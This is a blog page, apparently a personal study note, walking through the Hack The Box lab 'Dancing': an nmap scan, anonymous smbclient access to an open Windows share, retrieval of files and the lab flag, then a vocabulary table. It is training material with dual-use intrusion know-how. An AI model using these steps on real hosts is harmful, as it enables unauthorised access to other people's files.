@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        HTB-Dancing | KillMen's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">HTB-Dancing</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/HTB/" class="post-tag">#HTB</a>
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/STARTING-POINT/" class="post-tag">#STARTING POINT</a>
+  
+
+
+          <span class="post-date">2023-07-03</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>SMB &#x3D; Server Message Block</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip:~$ nmap -sV 10.129.166.135</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 10:00 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip-10-129-166-135.us-west-1.compute.internal (10.129.166.135)</span><br><span class="line">Host is up (0.076s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.26 seconds</span><br><span class="line"></span><br><span class="line">ubuntu@ip:~$ smbclient -L 10.129.166.135</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\ubuntu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        WorkShares      Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">ubuntu@ip:~$ smbclient \\\\10.129.166.135\\WorkShares</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\ubuntu]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">help</span></span><br><span class="line">?              allinfo        altname        archive        backup         </span><br><span class="line">blocksize      cancel         case_sensitive <span class="built_in">cd</span>             <span class="built_in">chmod</span>          </span><br><span class="line"><span class="built_in">chown</span>          close          del            deltree        <span class="built_in">dir</span>            </span><br><span class="line"><span class="built_in">du</span>             <span class="built_in">echo</span>           <span class="built_in">exit</span>           get            getfacl        </span><br><span class="line">geteas         hardlink       <span class="built_in">help</span>           <span class="built_in">history</span>        iosize         </span><br><span class="line">lcd            <span class="built_in">link</span>           lock           lowercase      <span class="built_in">ls</span>             </span><br><span class="line">l              mask           md             mget           <span class="built_in">mkdir</span>          </span><br><span class="line">more           mput           newer          notify         open           </span><br><span class="line">posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    </span><br><span class="line">posix_unlink   posix_whoami   <span class="built_in">print</span>          prompt         put            </span><br><span class="line"><span class="built_in">pwd</span>            q              queue          quit           <span class="built_in">readlink</span>       </span><br><span class="line">rd             recurse        reget          rename         reput          </span><br><span class="line"><span class="built_in">rm</span>             <span class="built_in">rmdir</span>          showacls       setea          setmode        </span><br><span class="line">scopy          <span class="built_in">stat</span>           symlink        tar            tarmode        </span><br><span class="line"><span class="built_in">timeout</span>        translate      unlock         volume         vuid           </span><br><span class="line">wdel           logon          listconnect    showconnect    tcon           </span><br><span class="line">tdis           tid            utimes         logoff         ..             </span><br><span class="line">!              </span><br><span class="line"></span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Mon Mar 29 08:22:01 2021</span><br><span class="line">  ..                                  D        0  Mon Mar 29 08:22:01 2021</span><br><span class="line">  Amy.J                               D        0  Mon Mar 29 09:08:24 2021</span><br><span class="line">  James.P                             D        0  Thu Jun  3 08:38:03 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1752067 blocks available</span><br><span class="line"></span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> Amy.J\</span><br><span class="line">smb: \Amy.J\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Mon Mar 29 09:08:24 2021</span><br><span class="line">  ..                                  D        0  Mon Mar 29 09:08:24 2021</span><br><span class="line">  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1752067 blocks available</span><br><span class="line"></span><br><span class="line">smb: \Amy.J\&gt; get worknotes.txt </span><br><span class="line">getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)</span><br><span class="line"></span><br><span class="line">smb: \Amy.J\&gt; <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Mon Mar 29 08:22:01 2021</span><br><span class="line">  ..                                  D        0  Mon Mar 29 08:22:01 2021</span><br><span class="line">  Amy.J                               D        0  Mon Mar 29 09:08:24 2021</span><br><span class="line">  James.P                             D        0  Thu Jun  3 08:38:03 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1752067 blocks available</span><br><span class="line"></span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> James.P\</span><br><span class="line"></span><br><span class="line">smb: \James.P\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Jun  3 08:38:03 2021</span><br><span class="line">  ..                                  D        0  Thu Jun  3 08:38:03 2021</span><br><span class="line">  flag.txt                            A       32  Mon Mar 29 09:26:57 2021</span><br><span class="line"></span><br><span class="line">                5114111 blocks of size 4096. 1752051 blocks available</span><br><span class="line"></span><br><span class="line">smb: \James.P\&gt; get flag.txt </span><br><span class="line">getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="line"></span><br><span class="line">smb: \James.P\&gt; <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">ubuntu@ip:~$ <span class="built_in">ls</span></span><br><span class="line">flag.txt  lab_KILLMEN.ovpn  lab_KILLMEN1.ovpn  snap  starting_point_KILLMEN.ovpn  worknotes.txt</span><br><span class="line"></span><br><span class="line">ubuntu@ip:~$ <span class="built_in">cat</span> worknotes.txt </span><br><span class="line">- start apache server on the linux machine</span><br><span class="line">- secure the ftp server</span><br><span class="line">- setup winrm on dancing ubuntu@ip-172-31-17-119:~$ </span><br><span class="line"></span><br><span class="line">ubuntu@ip:~$ <span class="built_in">cat</span> flag.txt </span><br><span class="line">5f61c10dffbc77a704d76016a22f1664</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/Dancing.png" alt="第三关Pwned！"></p>
+<table>
+<thead>
+<tr>
+<th>One of these</th>
+<th>其中一个；其中之一</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>serial ports</td>
+<td>串行端口</td>
+</tr>
+<tr>
+<td>reserved for</td>
+<td>保留给</td>
+</tr>
+<tr>
+<td>authentication</td>
+<td>n. 认证；鉴定；身份验证</td>
+</tr>
+<tr>
+<td>Hypothetically</td>
+<td>假设；假设地；假定地；假想</td>
+</tr>
+<tr>
+<td>alongside</td>
+<td>prep. 与…一起；在…旁边；与…同时；沿着 adv. 在…旁边；与…并排；在…的侧面</td>
+</tr>
+<tr>
+<td>tactic</td>
+<td>n. 战术；策略；手段；兵法；招数 adj. 排列的，顺序的；&lt;化&gt;有规立构的；&lt;生&gt;（有）趋性的</td>
+</tr>
+<tr>
+<td>prone</td>
+<td>adj. 俯卧的；易于遭受…的；易于遭受；有做…倾向的；有做(坏事)的倾向</td>
+</tr>
+<tr>
+<td>directories</td>
+<td>n. (计算机文件或程序的)目录；名录；电话号码簿；公司名录</td>
+</tr>
+</tbody></table>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/07/03/HTB-Redeemer/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>HTB-Redeemer</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/03/HTB-Fawn/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      HTB-Fawn
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">莫</div><div class="matts">挨</div><div class="matts">姥</div><div class="matts">子</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">乐</div><div class="matts">骟</div><div class="matts">好</div><div class="matts">弑</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:假的@email.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI3NzQ4NDkzNg==&mid=2247484469&idx=1&sn=8a442bb67397f52cce5c38c3f9b41e36&chksm=eb64c0d2dc1349c40d2e1bb55615ae28b3f2951be22f00717b9ade98c851082e42dc666ab45d#rd">微信公众号</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:假的@email.com">假的@email.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">KillMen's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
